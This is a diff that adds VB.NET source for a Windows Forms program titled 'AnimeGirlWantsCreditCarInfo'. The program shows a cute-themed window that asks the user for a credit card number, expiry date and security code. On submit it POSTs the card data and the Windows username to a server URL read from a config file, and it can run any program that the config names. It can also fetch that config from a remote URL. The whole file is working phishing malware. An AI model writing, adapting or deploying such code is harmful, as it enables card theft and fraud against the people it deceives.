@@ -1,0 +1,120 @@
+﻿Imports System.IO
+Imports System.Net
+Imports System.Runtime.InteropServices
+Imports System.Text
+Public Class AnimeGirlWantsCreditCarInfo
+    Dim DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Temp"
+    Dim ConfigFile As String = DIRCommons & "\AnimeGirlWantsCreditCarInfo.ini"
+    Dim userCanExit As Boolean = False
+
+    Private Sub AnimeGirlWantsCreditCarInfo_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        ReadParameters(Command())
+        ReadValues()
+    End Sub
+    Sub ReadParameters(ByVal parametros As String)
+        Try
+            If parametros <> Nothing Then
+                Dim parameter As String = parametros
+                Dim args() As String = parameter.Split(" ")
+
+                If args(0).ToLower = "--localconfig" Then
+                    ConfigFile = args(1)
+
+                ElseIf args(0).ToLower = "--remoteconfig" Then
+                    GetValues(args(1))
+
+                End If
+
+            End If
+        Catch ex As Exception
+            Console.WriteLine("[GetValues@AnimeGirlWantsCreditCarInfo]Error: " & ex.Message)
+            End
+        End Try
+    End Sub
+
+    Sub GetValues(ByVal fileURL As String)
+        Try
+            If My.Computer.FileSystem.FileExists(ConfigFile) Then
+                My.Computer.FileSystem.DeleteFile(ConfigFile)
+            End If
+            My.Computer.Network.DownloadFile(fileURL, ConfigFile)
+        Catch ex As Exception
+            Console.WriteLine("[GetValues@AnimeGirlWantsCreditCarInfo]Error: " & ex.Message)
+            End
+        End Try
+    End Sub
+    Sub ReadValues()
+        Try
+            Me.Size = New Size(GetIniValue("OPTIONS", "Size", ConfigFile, "740;300").Split(";")(0), GetIniValue("OPTIONS", "Size", ConfigFile, "740;300").Split(";")(1))
+
+            Dim meText As String = GetIniValue("TEXT", "Text", ConfigFile, "O-ohayo Hunter-san")
+            meText = meText.Replace("%username%", Environment.UserName)
+            meText = meText.Replace("%vbCrLf%", vbCrLf)
+            Me.Text = meText
+
+            Dim meInformation As String = GetIniValue("TEXT", "lbl_Information", ConfigFile, "uwu%vbCrLf%Can i have your credit card information? p-please")
+            meInformation = meInformation.Replace("%username%", Environment.UserName)
+            meInformation = meInformation.Replace("%vbCrLf%", vbCrLf)
+            Me.lbl_Information.Text = meInformation
+
+            Me.lbl_CardNumber.Text = GetIniValue("CARD", "lbl_CardNumber", ConfigFile, "Card Number: ")
+            Me.lbl_ExpiryDate.Text = GetIniValue("CARD", "lbl_ExpiryDate", ConfigFile, "Expiry date: ")
+            Me.lbl_SecurityCode.Text = GetIniValue("CARD", "lbl_SecurityCode", ConfigFile, "Security code: ")
+
+            Dim meButton As String = GetIniValue("CARD", "btn_Send", ConfigFile, "Th-thanks...")
+            meButton = meButton.Replace("%username%", Environment.UserName)
+            meButton = meButton.Replace("%vbCrLf%", vbCrLf)
+            Me.btn_Send.Text = meButton
+
+            Me.PictureBox1.ImageLocation = GetIniValue("IMAGE", "Picture", ConfigFile, "https://i.imgur.com/hhWP6Ie.jpeg")
+        Catch ex As Exception
+            Console.WriteLine("[ReadValues@AnimeGirlWantsCreditCarInfo]Error: " & ex.Message)
+            End
+        End Try
+    End Sub
+
+    Private Sub btn_Send_Click(sender As Object, e As EventArgs) Handles btn_Send.Click
+        If TextBox1.Text = Nothing Or TextBox2.Text = Nothing Or TextBox3.Text = Nothing Then
+        Else
+            Try
+                Dim reportContent As String = TextBox1.Text & vbCrLf & TextBox2.Text & vbCrLf & TextBox3.Text
+                Dim request As WebRequest = WebRequest.Create(GetIniValue("ACTION", "phpPost", ConfigFile))
+                request.Method = "POST"
+                Dim postData As String = "id=" & Environment.UserName & "_" & My.Application.Info.AssemblyName & "&content=" & reportContent
+                Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
+                request.ContentType = "application/x-www-form-urlencoded"
+                request.ContentLength = byteArray.Length
+                Dim dataStream As Stream = request.GetRequestStream()
+                dataStream.Write(byteArray, 0, byteArray.Length)
+                dataStream.Close()
+                Dim response As WebResponse = request.GetResponse()
+                response.Close()
+            Catch
+            End Try
+            Try
+                Process.Start(GetIniValue("ACTION", "Start", ConfigFile))
+            Catch
+            End Try
+            userCanExit = True
+            End
+        End If
+    End Sub
+
+    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
+        MsgBox(GetIniValue("ACTION", "ImageTouch", ConfigFile, "Hey, You can't touch me yet!"), MsgBoxStyle.ApplicationModal, Me.Text)
+    End Sub
+End Class
+Module Utility
+    <DllImport("kernel32")>
+    Private Function GetPrivateProfileString(ByVal section As String, ByVal key As String, ByVal def As String, ByVal retVal As StringBuilder, ByVal size As Integer, ByVal filePath As String) As Integer
+        'Use GetIniValue("KEY_HERE", "SubKEY_HERE", "filepath")
+    End Function
+    Public Function GetIniValue(section As String, key As String, filename As String, Optional defaultValue As String = Nothing) As String
+        Dim sb As New StringBuilder(500)
+        If GetPrivateProfileString(section, key, defaultValue, sb, sb.Capacity, filename) > 0 Then
+            Return sb.ToString
+        Else
+            Return defaultValue
+        End If
+    End Function
+End Module
